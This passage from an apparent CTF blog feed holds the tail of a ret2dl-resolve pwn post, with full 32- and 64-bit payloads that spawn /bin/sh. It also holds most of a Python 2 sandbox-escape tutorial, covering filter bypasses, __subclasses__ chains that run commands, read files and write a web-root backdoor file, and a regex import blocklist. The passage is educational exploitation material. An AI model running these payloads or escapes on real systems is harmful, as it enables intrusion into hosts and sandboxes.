memcpy(buf + 8, 0, 48) + # buf+1024+160 ; link_map-&gt;l_next-&gt;l_next-&gt;l_info[DT_PLTGOT]=buf+52        memcpy(buf + 1024 + 192, buf + 52, 4) + # buf+1024+180        memcpy(buf + 8, 0, 8) + # buf+1024+200 ; .got.plt=buf+12        memcpy(buf + 1024 + 232, buf + 12, 4) + # buf+1024+220        memcpy(buf + 8, 0, 12) + # buf+1024+240 ; _dl_runtime_resolve=buf+16        memcpy(buf + 1024 + 280, dl_runtime_resolve_addr, 4) + # buf+1024+260        memcpy(buf + 1024 + 284, link_map_addr, 4) + # buf+1024+280        p32(0) + # _dl_runtime_resolve        p32(0) + # link_map        p32(reloc_arg) + # reloc_arg        p32(0xdeadbeef) +        p32(buf + 2048 + 36)    ).ljust(2048, &#39;\x00&#39;) + # buf+2048        # Elf32_Rel        p32(buf) + # r_offset        p32(0x7 | (((buf + 2048 + 8 + 4 - dynsym) / 16) &lt;&lt; 8)) + # r_info        p32(0) + # padding        # Elf32_Sym &lt;= buf+2048+12        p32(buf + 2048 + 28 - dynstr) + # st_name        p32(0) + # st_value        p32(0) + # st_size        p32(0x12) + # st_info        # buf+2048+28        &#39;system\x00\x00&#39; +        &#39;/bin/sh\x00&#39;)</code></pre><p>64 位下会需要更长的输入才能完成一系列的构造：</p><pre><code class="python">payload = (    ((        &#39;A&#39; * 14 + # padding        p64(buf + 1024 - 8) + # set rbp=buf+1024-8        p64(leave_ret) # stack pivot ; set rsp=buf+1024    ).ljust(1024, &#39;\x00&#39;) +        memcpy(buf + 1024 + 160, r_debug_addr, 8) + # buf+1024+120        memcpy(buf, 0, 16) + # buf+1024+240 ; link_map_addr=buf+8        memcpy(buf + 1024 + 400, link_map_addr, 8) + # buf+1024+360        memcpy(buf + 16, 0, 32) + # buf+1024+480 ; l-&gt;l_next=buf+40        memcpy(buf + 1024 + 640, buf + 40, 8) + # buf+1024+600        memcpy(buf + 16, 0, 32) + # buf+1024+720 ; l-&gt;l_next-&gt;l_next=buf+40        memcpy(buf + 1024 + 880, buf + 40, 8) + # buf+1024+840        memcpy(buf + 16, 0, 96) + # buf+1024+960 ; l-&gt;l_next-&gt;l_next-&gt;l_info[DT_PLTGOT]=buf+104        memcpy(buf + 1024 + 1120, buf + 104, 8) + # buf+1024+1080        memcpy(buf + 16, 0, 16) + # buf+1024+1200 ; .got.plt=buf+24        memcpy(buf + 1024 + 1360, buf + 24, 8) + # buf+1024+1320        memcpy(buf + 16, 0, 24) + # buf+1024+1440 ; _dl_runtime+resolve=buf+32        memcpy(buf + 1024 + 1600, link_map_addr, 8) + # buf+1024+1560        write(1, 0, 0x1c8+8) + # buf+1024+1680        memcpy(buf + 1024 + 1840, link_map_addr, 8) + # buf+1024+1800        read(0, 0, 0x1c8+8) + # buf+1024+1920        memcpy(buf + 1024 + 2176, dl_runtime_resolve_addr, 8) + # buf+1024+2040        memcpy(buf + 1024 + 2184, link_map_addr, 8) + # buf+1024+2160        p64(pop_rdi_ret) +        p64(buf + 4096 + 40) +        p64(0) + # _dl_runtime_resolve        p64(0) + # link_map        p64(reloc_arg) # reloc_arg    ).ljust(4096, &#39;\x00&#39;) + # buf+4096        # Elf64_Rela        p64(buf) + # r_offset        p64(0x7 | (((buf + 4096 + 16 - dynsym) / 24) &lt;&lt; 32)) + # r_info        # Elf64_Sym &lt;= buf+4096+16        p32(buf + 4096 + 32 - dynstr) + # st_name        p32(0x12) + # st_info        p32(0) +        p32(0) +        # buf+4096+32        &#39;system\x00\x00&#39; +        &#39;/bin/sh\x00&#39;)</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.youtube.com/watch?v=wsIvqd9YqTI" target="_blank" rel="noopener">https://www.youtube.com/watch?v=wsIvqd9YqTI</a><br><a href="https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-di-frederico.pdf" target="_blank" rel="noopener">https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-di-frederico.pdf</a><br><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=42933" target="_blank" rel="noopener">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=42933</a><br><a href="http://www.inforsec.org/wp/?p=389" target="_blank" rel="noopener">http://www.inforsec.org/wp/?p=389</a><br><a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/" target="_blank" rel="noopener">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a><br><a href="http://rk700.github.io/2015/08/09/return-to-dl-resolve/" target="_blank" rel="noopener">http://rk700.github.io/2015/08/09/return-to-dl-resolve/</a><br><a href="http://phrack.org/issues/58/4.html" target="_blank" rel="noopener">http://phrack.org/issues/58/4.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;重看 Winesap 的视频收获颇多，重新把 return-to-dl-resolve 整理了一下。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
      <category term="pwn" scheme="blog.b3ale.cn/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>初探Python沙箱逃逸</title>
    <link href="blog.b3ale.cn/2020/04/02/%E5%88%9D%E6%8E%A2Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    <id>blog.b3ale.cn/2020/04/02/%E5%88%9D%E6%8E%A2Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</id>
    <published>2020-04-02T11:03:42.000Z</published>
    <updated>2020-04-03T03:41:06.880Z</updated>
    
    <content type="html"><![CDATA[<p>接触过的 Python 沙箱逃逸不是很多，参考了很多大佬的博客。本文主要基于 Python2。</p><a id="more"></a><blockquote><p>沙箱逃逸，就是在给我们的一个代码执行环境下，脱离种种过滤和限制，最终拿到 shell。</p></blockquote><p>对于 Python2 的沙箱逃逸而言，实现目的的最终想法有以下几个：</p><ul><li>使用 <code>os</code> 包中的 <code>popen</code>、<code>system</code> 两个函数</li><li>使用 <code>commands</code> 模块中的方法</li><li>使用 <code>subprocess</code> 模块中的方法</li><li>使用写文件到指定位置，再使用其他辅助手段</li></ul><p>总体来说，就是使用以下几个函数来执行命令：</p><pre><code class="python">import osimport subprocessimport commandsos.system(&#39;ifconfig&#39;)os.popen(&#39;ifconfig&#39;)commands.getoutput(&#39;ifconfig&#39;)commands.getstatusoutput(&#39;ifconfig&#39;)subprocess.call([&#39;ifconfig&#39;], shell=True)</code></pre><p>下面记录针对不同情况采取的绕过方法。</p><blockquote><p>PS：获取当前的 Python 环境</p><pre><code class="python">import sysprint sys.version</code></pre></blockquote><h1 id="一些有用的模块和函数"><a href="#一些有用的模块和函数" class="headerlink" title="一些有用的模块和函数"></a>一些有用的模块和函数</h1><p>除了上面提到的几个模块，还有几种可以曲线救国。</p><h2 id="timeit-模块"><a href="#timeit-模块" class="headerlink" title="timeit 模块"></a><code>timeit</code> 模块</h2><p>用于测试小代码片段的运行时间（<code>number</code> 即表示测试的次数）：</p><pre><code class="python">import timeittimeit.timeit(&quot;__import__(&#39;os&#39;).system(&#39;pwd&#39;)&quot;, number=1)</code></pre><h2 id="platform-模块"><a href="#platform-模块" class="headerlink" title="platform 模块"></a><code>platform</code> 模块</h2><p>类似 <code>os</code> 模块的 <code>popen</code>，可以执行命令：</p><pre><code class="python">import platformplatform.popen(&#39;pwd&#39;).read()</code></pre><h2 id="codecs-模块"><a href="#codecs-模块" class="headerlink" title="codecs 模块"></a><code>codecs</code> 模块</h2><p>可以用来读文件：</p><pre><code class="python">import codecscodecs.open(&#39;code.py&#39;).read()</code></pre><h2 id="exec-、eval-、execfile-、compile-函数"><a href="#exec-、eval-、execfile-、compile-函数" class="headerlink" title="exec()、eval()、execfile()、compile() 函数"></a><code>exec()</code>、<code>eval()</code>、<code>execfile()</code>、<code>compile()</code> 函数</h2><ul><li><code>exec()</code>：动态运行代码段，返回值为 <code>None</code></li><li><code>eval()</code>：计算单个表达式的值，有返回值</li><li><code>execfile()</code>：动态运行某个文件中的代码</li><li><code>compile()</code>：将一个字符串编译为字节代码</li></ul><pre><code class="python">In [1]: o = compile(&#39;a = 1 + 1&#39;, &#39;&lt;string&gt;&#39;, &#39;exec&#39;)In [2]: exec(o)In [3]: print a2</code></pre><h1 id="字符串过滤的绕过"><a href="#字符串过滤的绕过" class="headerlink" title="字符串过滤的绕过"></a>字符串过滤的绕过</h1><p>如果是某个字符串被过滤了，可以对它进行一些变换：</p><pre><code class="python">In [1]: d = {&#39;key&#39;: 1}In [2]: print d[&#39;yek&#39;[::-1]]1</code></pre><p>如果是关键字被过滤了，可以使用 <code>getattr</code>。<code>getattr</code> 接收两个参数，第一个是模块或对象，第二个是一个字符串。它会在模块或对象中搜索指定的函数或属性：</p><pre><code class="python">In [1]: import osIn [2]: getattr(os, &#39;676574637764&#39;.decode(&#39;hex&#39;))()Out[2]: &#39;/usr/lib/python2.7&#39;</code></pre><h1 id="import-花式处理"><a href="#import-花式处理" class="headerlink" title="import 花式处理"></a><code>import</code> 花式处理</h1><p><code>import</code> 关键字用来导入包，沙箱中对一些包或是函数进行了屏蔽，从 <code>import</code> 的不同方法到 <code>import</code> 的本质有多种不同的绕过方法。</p><h2 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h2><p>防御最基础的思路就是正则匹配代码中的内容，检测是否调用了 <code>import</code>：</p><pre><code class="python">In [1]: import re   ...: code = &#39;import os&#39;   ...: pat = re.compile(&#39;import\s+(os|commands|subprocess|sys)&#39;)   ...: if pat.search(code) != None:   ...:     raise Exception, &#39;Detected forbidden module.&#39;   ...:---------------------------------------------------------------------------Exception                                 Traceback (most recent call last)&lt;ipython-input-1-db50a328bbb7&gt; in &lt;module&gt;()      3 pat = re.compile(&#39;import\s+(os|commands|subprocess|sys)&#39;)      4 if pat.search(code) != None:----&gt; 5     raise Exception, &#39;Detected forbidden module.&#39;Exception: Detected forbidden module.</code></pre><p>绕过的方式也很简单，使用其他的方式来导入其他包名：</p><ul><li><code>import</code> 关键字</li><li><code>__import__</code> 函数</li><li><code>importlib</code> 库</li></ul><pre><code class="python">__import__(&#39;Y29tbWFuZHM=&#39;.decode(&#39;base64&#39;)).getoutput(&#39;pwd&#39;)import importlibx = importlib.import_module(&#39;pbzznaqf&#39;.decode(&#39;rot_13&#39;))print x.getoutput(&#39;pwd&#39;)</code></pre><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>在 Python2 中不用直接使用的内置函数被称为 builtin 函数，跟随 <code>__builtin__</code> 模块自动被加载。例如 <code>open()</code>、<code>int()</code>、<code>chr()</code> 这些函数相当于如下形式：</p><pre><code class="python">__builtin__.open()__builtin__.int()__builtin__.chr()</code></pre><p>防御的一种方法就是用 <code>del</code> 把这些函数删除：</p><pre><code class="python">In [1]: del __builtin__.chrIn [2]: chr(1)---------------------------------------------------------------------------NameError                                 Traceback (most recent call last)&lt;ipython-input-2-288f58b79c7d&gt; in &lt;module&gt;()----&gt; 1 chr(1)NameError: name &#39;chr&#39; is not defined</code></pre><p>绕过的方法是使用 <code>reload</code> 来重新加载 <code>__builtin__</code> 模块：</p><pre><code class="python">In [1]: reload(__builtin__)Out[1]: &lt;module &#39;__builtin__&#39; (built-in)&gt;In [2]: chr(1)Out[2]: &#39;\x01&#39;</code></pre><p>同时 <code>reload</code> 也是 <code>__builtin__</code> 下的一个函数，如果删除了它该怎么办？答案是使用 <code>imp</code> 模块，也可以对 <code>__builtin</code> 进行重新导入：</p><pre><code class="python">In [1]: import impIn [2]: imp.reload(__builtin__)Out[2]: &lt;module &#39;__builtin__&#39; (built-in)&gt;In [3]: chr(1)Out[3]: &#39;\x01&#39;</code></pre><h2 id="Advance"><a href="#Advance" class="headerlink" title="Advance"></a>Advance</h2><p>Python 中的所有包都是以 <code>.py</code> 文件的形式存在的，说明所有 <code>import</code> 进来的包一开始都预先在某个位置了。一般和系统相关的信息都在 <code>sys</code> 下，使用 <code>sys.path</code> 查看各个包的路径：</p><pre><code class="python">In [1]: import sysIn [2]: sys.pathOut[2]:[&#39;&#39;, &#39;/usr/local/bin&#39;, &#39;/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python27.zip&#39;, &#39;/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7&#39;, &#39;/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/plat-darwin&#39;, &#39;/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/plat-mac&#39;, &#39;/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/plat-mac/lib-scriptpackages&#39;, &#39;/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-tk&#39;, &#39;/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-old&#39;, &#39;/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-dynload&#39;, &#39;~/Library/Python/2.7/lib/python/site-packages&#39;, &#39;/usr/local/lib/python2.7/site-packages&#39;, &#39;/usr/local/lib/python2.7/site-packages/oletools-0.54.2-py2.7.egg&#39;, &#39;/usr/local/lib/python2.7/site-packages/msoffcrypto_tool-4.10.1-py2.7.egg&#39;, &#39;/usr/local/lib/python2.7/site-packages/colorclass-2.2.0-py2.7.egg&#39;, &#39;/usr/local/lib/python2.7/site-packages/easygui-0.98.1-py2.7.egg&#39;, &#39;/usr/local/lib/python2.7/site-packages/olefile-0.46-py2.7.egg&#39;, &#39;/usr/local/lib/python2.7/site-packages/ida_netnode-1.1-py2.7.egg&#39;, &#39;/usr/local/lib/python2.7/site-packages/wasm-1.2-py2.7.egg&#39;, &#39;~/Tools/python-uncompyle6&#39;, &#39;/usr/local/lib/python2.7/site-packages/PyMySQL-0.9.3-py2.7.egg&#39;, &#39;/usr/local/lib/python2.7/site-packages/pysm4-0.7-py2.7.egg&#39;, &#39;/usr/local/lib/python2.7/site-packages/gtk-2.0&#39;, &#39;/usr/local/lib/python2.7/site-packages/gtk-2.0&#39;, &#39;/usr/local/lib/python2.7/site-packages/IPython/extensions&#39;, &#39;~/.ipython&#39;]</code></pre><p><code>sys</code> 下还有一个 <code>modules</code>，返回一个字典，其中可以查看各个模块对应的系统路径。如果修改这个字典中的内容，前面使用的方法就都失效了：</p><pre><code class="python">In [1]: import sysIn [2]: sys.modules[&#39;os&#39;] = NoneIn [3]: import os---------------------------------------------------------------------------ImportError                               Traceback (most recent call last)&lt;ipython-input-9-543d7f3a58ae&gt; in &lt;module&gt;()----&gt; 1 import osImportError: No module named osIn [4]: __import__(&#39;os&#39;)---------------------------------------------------------------------------ImportError                               Traceback (most recent call last)&lt;ipython-input-10-1b9b14481c7e&gt; in &lt;module&gt;()----&gt; 1 __import__(&#39;os&#39;)ImportError: No module named osIn [5]: import importlibIn [6]: importlib.import_module(&#39;os&#39;)---------------------------------------------------------------------------ImportError                               Traceback (most recent call last)&lt;ipython-input-12-51afbccc7d3c&gt; in &lt;module&gt;()----&gt; 1 importlib.import_module(&#39;os&#39;)/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/importlib/__init__.pyc in import_module(name, package)     35             level += 1     36         name = _resolve_name(name[level:], package, level)---&gt; 37     __import__(name)     38     return sys.modules[name]ImportError: No module named os</code></pre><p>解决这种情况，就得尝试把对应的模块路径修复回来，一般默认的 <code>os</code> 模块是在 <code>/usr/bin/python2.7/os.py</code>：</p><pre><code class="python">In [1]: import sysIn [2]: sys.modules[&#39;os&#39;] = &#39;/usr/lib/python2.7/os.py&#39;In [3]: import os</code></pre><h2 id="Hell"><a href="#Hell" class="headerlink" title="Hell"></a>Hell</h2><p>如果把 <code>sys</code>、<code>os</code>、<code>reload</code> 等一系列模块都过滤掉了，使用什么方法来绕过呢？导入模块的过程其实就是把对应模块的代码执行一遍的过程，在知道模块对应路径的情况下，就可以相应地执行它：</p><pre><code class="python">In [1]: execfile(&#39;/usr/lib/python2.7/os.py&#39;)In [2]: system(&#39;pwd&#39;)/usr/lib/python2.7Out[2]: 0In [3]: getcwd()Out[3]: &#39;/usr/lib/python2.7&#39;</code></pre><p>在 <code>execfile</code> 被禁止的情况下，还可以用 <code>open</code> 读入文件，并使用 <code>exec</code> 来执行相应的代码：</p><pre><code class="python">In [1]: code = open(&#39;/usr/lib/python2.7/os.py&#39;, &#39;r&#39;).read()In [2]: exec codeIn [3]: getcwd()Out[3]: &#39;/usr/lib/python2.7&#39;</code></pre><h1 id="各类内联函数和属性的使用"><a href="#各类内联函数和属性的使用" class="headerlink" title="各类内联函数和属性的使用"></a>各类内联函数和属性的使用</h1><h2 id="dir-和-dict"><a href="#dir-和-dict" class="headerlink" title="dir 和 __dict__"></a><code>dir</code> 和 <code>__dict__</code></h2><p><code>dir</code> 和 <code>__dict__</code> 可以用来查看类或对象下的所有属性信息：</p><pre><code class="python">In [1]: class A():    ...:     def __init__(self):    ...:         self.a = &#39;a&#39;    ...:In [2]: dir(A)Out[2]: [&#39;__doc__&#39;, &#39;__init__&#39;, &#39;__module__&#39;]In [3]: A.__dict__Out[3]:{&#39;__doc__&#39;: None, &#39;__init__&#39;: &lt;function __main__.__init__&gt;, &#39;__module__&#39;: &#39;__main__&#39;}</code></pre><p>和 <code>sys.modules</code> 配合使用获得一个模块的引用：</p><pre><code class="python">In [1]: import sysIn [2]: dir(sys.modules[__name__])Out[2]:[&#39;In&#39;, &#39;Out&#39;, &#39;_&#39;, &#39;_11&#39;, &#39;_12&#39;, &#39;_13&#39;, &#39;_14&#39;, &#39;_15&#39;, &#39;_8&#39;, &#39;__&#39;, &#39;___&#39;, &#39;__builtin__&#39;, &#39;__builtins__&#39;, &#39;__doc__&#39;, &#39;__name__&#39;, &#39;__package__&#39;, &#39;_dh&#39;, &#39;_i&#39;, &#39;_i1&#39;, &#39;_i10&#39;, &#39;_i11&#39;, &#39;_i12&#39;, &#39;_i13&#39;, &#39;_i14&#39;, &#39;_i15&#39;, &#39;_i16&#39;, &#39;_i17&#39;, &#39;_i2&#39;, &#39;_i3&#39;, &#39;_i4&#39;, &#39;_i5&#39;, &#39;_i6&#39;, &#39;_i7&#39;, &#39;_i8&#39;, &#39;_i9&#39;, &#39;_ih&#39;, &#39;_ii&#39;, &#39;_iii&#39;, &#39;_oh&#39;, &#39;_sh&#39;, &#39;d&#39;, &#39;exit&#39;, &#39;get_ipython&#39;, &#39;os&#39;, &#39;quit&#39;, &#39;s&#39;, &#39;sys&#39;]</code></pre><h2 id="func-code-的利用"><a href="#func-code-的利用" class="headerlink" title="func_code 的利用"></a><code>func_code</code> 的利用</h2><p>函数的 <code>func_code</code> 属性可以被用来查看函数的参数个数以及变量，还能看到函数对应的字节码：</p><pre><code class="python">In [1]: def f(x, y, z):    ...:     a = &#39;secret&#39;    ...:     b = 2333    ...:In [2]: f.func_code.co_argcountOut[2]: 3In [3]: f.func_code.co_constsOut[3]: (None, &#39;secret&#39;, 2333)In [4]: f.func_code.co_codeOut[4]: &#39;d\x01\x00}\x03\x00d\x02\x00}\x04\x00d\x00\x00S&#39;</code></pre><p>使用 <code>dis</code> 库可以获取函数对应汇编格式的字节码：</p><pre><code class="python">In [1]: import disIn [2]: dis.dis(f)  2           0 LOAD_CONST               1 (&#39;secret&#39;)              3 STORE_FAST               3 (a)  3           6 LOAD_CONST               2 (2333)              9 STORE_FAST               4 (b)             12 LOAD_CONST               0 (None)             15 RETURN_VALUE</code></pre><h2 id="mro-和-bases-属性"><a href="#mro-和-bases-属性" class="headerlink" title="__mro__ 和 __bases__ 属性"></a><code>__mro__</code> 和 <code>__bases__</code> 属性</h2><p>Python 允许多重继承，即一个子类有多个父类。<code>__mro__</code> 属性可以用来查看一个子类所有的父类；<code>__bases__</code> 可以获取上一层的继承关系：</p><pre><code class="python">In [1]: class A(object): passIn [2]: class B(object): passIn [3]: class C(A, B): passIn [4]: C.__bases__Out[4]: (__main__.A, __main__.B)In [5]: C.__mro__Out[5]: (__main__.C, __main__.A, __main__.B, object)In [6]: 1..__class__.__bases__Out[6]: (object,)In [7]: 1..__class__.__mro__Out[7]: (float, object)In [8]: &#39;&#39;.__class__.__bases__Out[8]: (basestring,)In [9]: &#39;&#39;.__class__.__mro__Out[9]: (str, basestring, object)</code></pre><p>比如在 <code>open</code> 等文件操作被限制的情况下可以用下面的方法读取文件内容（<code>__subclasses__</code> 即用来查看对象的所有子类；<code>Object</code> 的查询结果中第 40 个类为 <code>file</code>）：</p><pre><code class="python">&#39;&#39;.__class__.__mro__[-1].__subclasses__()[40](&#39;/usr/lib/python2.7/os.py&#39;).read()1..__class__.__bases__[0].__subclasses__()[40](&#39;/usr/lib/python2.7/os.py&#39;).read()</code></pre><p>其他的一些执行命令的方法（通过获取其他已经载入了 os 等模块的类进行调用）：</p><pre><code class="python"># 执行系统命令().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].os.system(&#39;ls&#39;)().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)# 重新载入__builtin__().__class__.__bases__[0].__subclasses__()[59]()._module.__builtin__[&#39;__import__&#39;](&quot;os&quot;).system(&quot;ls&quot;)# 读文件().__class__.__bases__[0].__subclasses__()[40](r&#39;C:\1.php&#39;).read()# 写文件().__class__.__bases__[0].__subclasses__()[40](&#39;/var/www/html/bkdoor&#39;, &#39;w&#39;).write(&#39;123&#39;)# 执行任意命令().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;ls /var/www/html&quot;).read()&#39;)</code></pre><p>可以编写一个函数对导入了 <code>os</code> 或 <code>sys</code> 的库进行一个遍历：</p><pre><code class="python">#!/usr/bin/env pythonall_modules = [    &#39;BaseHTTPServer&#39;, &#39;imaplib&#39;, &#39;shelve&#39;, &#39;Bastion&#39;, &#39;anydbm&#39;, &#39;imghdr&#39;, &#39;shlex&#39;, &#39;CDROM&#39;, &#39;argparse&#39;, &#39;imp&#39;, &#39;shutil&#39;, &#39;CGIHTTPServer&#39;, &#39;array&#39;, &#39;importlib&#39;, &#39;signal&#39;, &#39;ast&#39;, &#39;imputil&#39;, &#39;site&#39;, &#39;ConfigParser&#39;, &#39;asynchat&#39;, &#39;inspect&#39;, &#39;sitecustomize&#39;, &#39;Cookie&#39;, &#39;asyncore&#39;, &#39;io&#39;, &#39;smtpd&#39;, &#39;DLFCN&#39;, &#39;atexit&#39;, &#39;itertools&#39;, &#39;smtplib&#39;, &#39;audiodev&#39;, &#39;json&#39;, &#39;sndhdr&#39;, &#39;DocXMLRPCServer&#39;, &#39;audioop&#39;, &#39;keyword&#39;, &#39;socket&#39;, &#39;base64&#39;, &#39;lib2to3&#39;, &#39;spwd&#39;, &#39;FixTk&#39;, &#39;bdb&#39;, &#39;linecache&#39;, &#39;sqlite3&#39;, &#39;HTMLParser&#39;, &#39;binascii&#39;, &#39;linuxaudiodev&#39;, &#39;sre&#39;, &#39;IN&#39;, &#39;binhex&#39;, &#39;locale&#39;, &#39;sre_compile&#39;, &#39;MimeWriter&#39;, &#39;bisect&#39;, &#39;logging&#39;, &#39;sre_constants&#39;, &#39;Queue&#39;, &#39;bsddb&#39;, &#39;sre_parse&#39;, &#39;bz2&#39;, &#39;macpath&#39;, &#39;ssl&#39;, &#39;cPickle&#39;, &#39;macurl2path&#39;, &#39;stat&#39;, &#39;SimpleHTTPServer&#39;, &#39;cProfile&#39;, &#39;mailbox&#39;, &#39;statvfs&#39;, &#39;SimpleXMLRPCServer&#39;, &#39;cStringIO&#39;, &#39;mailcap&#39;, &#39;string&#39;, &#39;SocketServer&#39;, &#39;calendar&#39;, &#39;markupbase&#39;, &#39;stringold&#39;, &#39;StringIO&#39;, &#39;cgi&#39;, &#39;marshal&#39;, &#39;stringprep&#39;, &#39;TYPES&#39;, &#39;cgitb&#39;, &#39;math&#39;, &#39;strop&#39;, &#39;chunk&#39;, &#39;md5&#39;, &#39;struct&#39;, &#39;Tkconstants&#39;, &#39;cmath&#39;, &#39;mhlib&#39;, &#39;subprocess&#39;, &#39;cmd&#39;, &#39;mimetools&#39;, &#39;sunau&#39;, &#39;code&#39;, &#39;mimetypes&#39;, &#39;sunaudio&#39;, &#39;UserDict&#39;, &#39;codecs&#39;, &#39;mimify&#39;, &#39;symbol&#39;, &#39;UserList&#39;, &#39;codeop&#39;, &#39;mmap&#39;, &#39;symtable&#39;, &#39;UserString&#39;, &#39;collections&#39;, &#39;modulefinder&#39;, &#39;sys&#39;, &#39;colorsys&#39;, &#39;multifile&#39;, &#39;sysconfig&#39;, &#39;commands&#39;, &#39;multiprocessing&#39;, &#39;syslog&#39;, &#39;__builtin__&#39;, &#39;compileall&#39;, &#39;mutex&#39;, &#39;tabnanny&#39;, &#39;__future__&#39;, &#39;compiler&#39;, &#39;netrc&#39;, &#39;_abcoll&#39;, &#39;contextlib&#39;, &#39;new&#39;, &#39;tarfile&#39;, &#39;_ast&#39;, &#39;cookielib&#39;, &#39;nis&#39;, &#39;telnetlib&#39;, &#39;_bisect&#39;, &#39;copy&#39;, &#39;nntplib&#39;, &#39;tempfile&#39;, &#39;_bsddb&#39;, &#39;copy_reg&#39;, &#39;ntpath&#39;, &#39;termios&#39;, &#39;_codecs&#39;, &#39;crypt&#39;, &#39;nturl2path&#39;, &#39;test&#39;, &#39;_codecs_cn&#39;, &#39;csv&#39;, &#39;numbers&#39;, &#39;textwrap&#39;, &#39;_codecs_hk&#39;, &#39;ctypes&#39;, &#39;opcode&#39;, &#39;_codecs_iso2022&#39;, &#39;curses&#39;, &#39;operator&#39;, &#39;thread&#39;, &#39;_codecs_jp&#39;, &#39;datetime&#39;, &#39;optparse&#39;, &#39;threading&#39;, &#39;_codecs_kr&#39;, &#39;dbhash&#39;, &#39;os&#39;, &#39;time&#39;, &#39;_codecs_tw&#39;, &#39;dbm&#39;, &#39;os2emxpath&#39;, &#39;timeit&#39;, &#39;_collections&#39;, &#39;decimal&#39;, &#39;ossaudiodev&#39;, &#39;_csv&#39;, &#39;difflib&#39;, &#39;parser&#39;, &#39;_ctypes&#39;, &#39;dircache&#39;, &#39;pdb&#39;, &#39;_ctypes_test&#39;, &#39;dis&#39;, &#39;pickle&#39;, &#39;_curses&#39;, &#39;distutils&#39;, &#39;pickletools&#39;, &#39;_curses_panel&#39;, &#39;doctest&#39;, &#39;pipes&#39;, &#39;_elementtree&#39;, &#39;dumbdbm&#39;, &#39;pkgutil&#39;, &#39;toaiff&#39;, &#39;_functools&#39;, &#39;dummy_thread&#39;, &#39;platform&#39;, &#39;token&#39;, &#39;_hashlib&#39;, &#39;dummy_threading&#39;, &#39;plistlib&#39;, &#39;tokenize&#39;, &#39;_heapq&#39;, &#39;email&#39;, &#39;popen2&#39;, &#39;trace&#39;, &#39;_hotshot&#39;, &#39;encodings&#39;, &#39;poplib&#39;, &#39;traceback&#39;, &#39;_io&#39;, &#39;ensurepip&#39;, &#39;posix&#39;, &#39;_json&#39;, &#39;errno&#39;, &#39;posixfile&#39;, &#39;tty&#39;, &#39;_locale&#39;, &#39;exceptions&#39;, &#39;posixpath&#39;, &#39;_lsprof&#39;, &#39;fcntl&#39;, &#39;pprint&#39;, &#39;types&#39;, &#39;_md5&#39;, &#39;filecmp&#39;, &#39;profile&#39;, &#39;unicodedata&#39;, &#39;_multibytecodec&#39;, &#39;fileinput&#39;, &#39;pstats&#39;, &#39;unittest&#39;, &#39;_multiprocessing&#39;, &#39;fnmatch&#39;, &#39;pty&#39;, &#39;urllib&#39;, &#39;_osx_support&#39;, &#39;formatter&#39;, &#39;pwd&#39;, &#39;urllib2&#39;, &#39;_pyio&#39;, &#39;fpformat&#39;, &#39;py_compile&#39;, &#39;urlparse&#39;, &#39;_random&#39;, &#39;fractions&#39;, &#39;pyclbr&#39;, &#39;user&#39;, &#39;_sha&#39;, &#39;ftplib&#39;, &#39;pydoc&#39;, &#39;uu&#39;, &#39;_sha256&#39;, &#39;functools&#39;, &#39;pydoc_data&#39;, &#39;uuid&#39;, &#39;_sha512&#39;, &#39;future_builtins&#39;, &#39;pyexpat&#39;, &#39;warnings&#39;, &#39;_socket&#39;, &#39;gc&#39;, &#39;quopri&#39;, &#39;wave&#39;, &#39;_sqlite3&#39;, &#39;genericpath&#39;, &#39;random&#39;, &#39;weakref&#39;, &#39;_sre&#39;, &#39;getopt&#39;, &#39;re&#39;, &#39;webbrowser&#39;, &#39;_ssl&#39;, &#39;getpass&#39;, &#39;readline&#39;, &#39;whichdb&#39;, &#39;_strptime&#39;, &#39;gettext&#39;, &#39;repr&#39;, &#39;wsgiref&#39;, &#39;_struct&#39;, &#39;glob&#39;, &#39;resource&#39;, &#39;xdrlib&#39;, &#39;_symtable&#39;, &#39;grp&#39;, &#39;rexec&#39;, &#39;xml&#39;, &#39;_sysconfigdata&#39;, &#39;gzip&#39;, &#39;rfc822&#39;, &#39;xmllib&#39;, &#39;_sysconfigdata_nd&#39;, &#39;hashlib&#39;, &#39;rlcompleter&#39;, &#39;xmlrpclib&#39;, &#39;_testcapi&#39;, &#39;heapq&#39;, &#39;robotparser&#39;, &#39;xxsubtype&#39;, &#39;_threading_local&#39;, &#39;hmac&#39;, &#39;runpy&#39;, &#39;zipfile&#39;, &#39;_warnings&#39;, &#39;hotshot&#39;, &#39;sched&#39;, &#39;zipimport&#39;, &#39;_weakref&#39;, 